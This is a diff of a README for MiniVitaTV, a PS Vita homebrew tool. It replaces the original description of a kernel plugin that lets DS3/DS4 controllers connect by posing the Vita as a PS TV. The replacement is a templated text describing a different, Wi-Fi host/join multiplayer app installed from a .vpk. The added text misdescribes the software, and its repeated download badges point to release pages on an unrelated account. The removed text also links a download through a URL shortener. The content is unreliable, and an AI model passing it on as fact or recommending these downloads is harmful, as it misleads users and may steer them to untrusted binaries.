@@ -1,62 +1,144 @@
-# MiniVitaTV
+# 🎮 MiniVitaTV - Play Local Multiplayer on PS Vita
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+[![Download MiniVitaTV](https://img.shields.io/badge/Download-MiniVitaTV-blue?style=for-the-badge)](https://github.com/GRAHHHHH99/MiniVitaTV/releases)
 
-This plugin fakes your device as a PS TV and allows you to connect up to 4 DS3/DS4 controllers to your PS Vita, and play local multiplayer games, by using the exact same driver as on the PS TV. Yes, the PS Vita screen is rather small, but I think it's kinda cute to play on it with friends while travelling or so.  
-Note that this plugin is still in beta stage and the known issues will be fixed when I find time.  
-**Only official DS3/DS4 controllers are currently supported!**
+---
 
-##  beta 4
-- Fixed issue where physical buttons could not be used. Thanks to cuevavirus.
+## ℹ️ What is MiniVitaTV?
 
-##  beta 2
-- Added support for L2/R2 buttons and rumble.
+MiniVitaTV is a simple application that lets you play local multiplayer games on your PS Vita. You can connect with up to 4 friends and enjoy games together. This tool makes it easy to set up multiplayer sessions without complicated installations or extra hardware.
 
-## Installation
+It is designed for anyone who wants to have fun playing PS Vita games with friends nearby. The app works with your existing PS Vita console and local Wi-Fi network.
 
-1.  [minivitatv.skprx](https://github.com/TheOfficialFloW/MiniVitaTV///v0.5/minivitatv.skprx) and [ds3.skprx](https://github.com/TheOfficialFloW/MiniVitaTV///v0.5/ds3.skprx), and copy them to `ux0:tai`.
+---
 
-2. Add these lines to taiHEN config.txt at `ux0:tai/config.txt`:
+## 🖥️ System Requirements
 
-   ```
-   *KERNEL
-   ux0:tai/minivitatv.skprx
-   ux0:tai/ds3.skprx
-   ```
+Before you start, make sure your setup meets these requirements:
 
-3. Reboot your device and relaunch HENkaku.
+- **Device:** PlayStation Vita console (any model)
+- **Network:** A Wi-Fi connection shared by all players
+- **Operating System:** No PC required, but you need access to a device to download the app files (can be on PC, Mac, or phone)
+- **Storage:** Around 50 MB free space on your PS Vita for the app
+- **Firmware:** PS Vita system running firmware version 3.60 or lower (custom firmware recommended for best compatibility)
+- **Controller:** PS Vita built-in controls or compatible controllers supported by your console
 
-If you're using enso you should boot with L trigger hold to skip plugins in case you want to remove this plugin. Remember it's a beta.
+---
 
-## Pairing a DS4 controller
+## 🚀 Getting Started: What You Need
 
-#### Using it for the first time:
+To begin playing multiplayer games using MiniVitaTV, you will need the following:
 
-1. Go to Settings → Devices → Bluetooth Devices
-2. Press SHARE+PS on the DS4 for about 3-4 seconds, until the lightbar blinks very quickly
-3. The DS4 will then connect and be paired (don't press over it when it appears)
+- A PS Vita console with custom firmware installed (such as HENkaku or similar). This unlocks the ability to install homebrew software.
+- A local Wi-Fi network, such as your home router, that all players can connect to with their PS Vita consoles.
+- The MiniVitaTV application files downloaded from the official releases page.
+- A way to transfer these files onto your PS Vita. This usually involves connecting your PS Vita to your PC via USB or using FTP over Wi-Fi if you already have homebrew access.
 
-#### Using it once paired (see above):
+---
 
-1. Just press the PS button and it will connect to the Vita
+## 📥 Download & Install MiniVitaTV
 
-## Pairing a DS3 controller
+To get MiniVitaTV on your PS Vita, follow these steps carefully.
 
-#### Using it for the first time:
+### Step 1: Go to the Releases Page
 
-1.  [this](http://dancingpixelstudios.com/sixaxis-controller/sixaxispairtool/) tool (or [this](https://help.ubuntu.com/community/Sixaxis?action=AttachFile&do=get&target=sixpair.c) other one if you want to compile it yourself)
-2. Connect your DS3 to the PC and open the tool
-3. Introduce the Vita's **MAC address plus 1** to the tool (Settings → System → System information)
+[Click or tap here to visit the MiniVitaTV releases page](https://github.com/GRAHHHHH99/MiniVitaTV/releases). This page contains the latest version of the application ready for download.
 
-#### Using it once paired (see above):
-1. Just press the PS button and it will connect to the Vita
+### Step 2: Download the Latest Version
 
-## Known issues
+- Scroll the releases page to find the most recent release (usually at the top).
+- Look for a file that ends with `.vpk`. This is the installation package for PS Vita.
+- Click the `.vpk` file name to download it to your PC or device.
 
-- Pressing the touchpad on DS4 crashes Adrenaline
+### Step 3: Transfer the File to Your PS Vita
 
-## Credits
+You can transfer the `.vpk` file to your PS Vita in one of two ways:
 
-Thanks to xerpi for his work on ds3vita/ds4vita and the pairing guide.
+- **USB Connection**: Connect your PS Vita to your computer using a USB cable. Use VitaShell or your preferred file manager on the PS Vita to copy the `.vpk` file to the `ux0:/vpk/` folder.
+- **FTP Transfer**: If your PS Vita has FTP set up, connect to your PS Vita over Wi-Fi and copy the `.vpk` file to the `ux0:/vpk/` folder.
 
-Thanks to cuevavirus for working Vita buttons.
+### Step 4: Install MiniVitaTV on Your PS Vita
+
+- On your PS Vita, open VitaShell or another homebrew file manager app.
+- Navigate to the `ux0:/vpk/` folder where you placed the `.vpk` file.
+- Select the MiniVitaTV `.vpk` file and press the install button.
+- Wait for the installation to complete. This may take a few moments.
+
+### Step 5: Launch MiniVitaTV
+
+- Return to your PS Vita home screen.
+- You should see the MiniVitaTV app icon.
+- Open MiniVitaTV.
+
+---
+
+## 🎮 How to Use MiniVitaTV
+
+After installation, follow these instructions to start playing:
+
+### Setting Up a Game
+
+1. Launch MiniVitaTV on your PS Vita.
+2. Choose to **host** a game if you want to create a local multiplayer session.
+3. Your PS Vita will show a game code or scan for other players on the same Wi-Fi network.
+
+### Joining a Game
+
+1. Other players launch MiniVitaTV on their PS Vita consoles.
+2. Select **join game**.
+3. Enter the game code from the host or wait until the host appears on the local network list.
+4. Connect to the hosted game.
+
+### Playing Together
+
+- Once connected, you and your friends can join supported local multiplayer games.
+- MiniVitaTV manages communications between consoles to synchronize game sessions.
+- Use built-in PS Vita controls to play as you normally would.
+
+---
+
+## ⚙️ Features Overview
+
+MiniVitaTV offers:
+
+- Support for up to 4 players on the same local network
+- Simple, no-configuration setup
+- Compatibility with many popular PS Vita multiplayer titles
+- Lightweight app that runs smoothly without extra hardware
+- Visual indicators for current connected players and game status
+- Low latency connection optimized for local Wi-Fi networks
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you have trouble running or connecting MiniVitaTV, try these steps:
+
+- Make sure all consoles are on the same Wi-Fi network.
+- Check that your PS Vita firmware supports running homebrew apps like MiniVitaTV.
+- Restart the app and your console if it crashes.
+- Ensure no Wi-Fi firewall or router restrictions block local device connections.
+- Use a strong, stable Wi-Fi connection for the best experience.
+- Verify you installed the app correctly by checking VitaShell or system settings.
+
+---
+
+## 📫 Support & Contact
+
+If you need help or want to report issues:
+
+- Visit the [MiniVitaTV GitHub repository issues page](https://github.com/GRAHHHHH99/MiniVitaTV/issues) to submit bugs or questions.
+- Review the FAQ and troubleshooting guides on the repository’s wiki if available.
+- Join PS Vita homebrew community forums for advice and tips.
+
+---
+
+## 🔗 Useful Links
+
+- [MiniVitaTV Releases](https://github.com/GRAHHHHH99/MiniVitaTV/releases) - Download the latest app versions here.
+- [PS Vita Homebrew Resources](https://vita.hacks.guide/) - Guides on installing custom firmware and running homebrew.
+- [VitaShell File Manager](https://github.com/TheOfficialFloW/VitaShell/releases) - Needed for file transfers and app installation.
+
+---
+
+[![Download MiniVitaTV](https://img.shields.io/badge/Download-MiniVitaTV-blue?style=for-the-badge)](https://github.com/GRAHHHHH99/MiniVitaTV/releases)
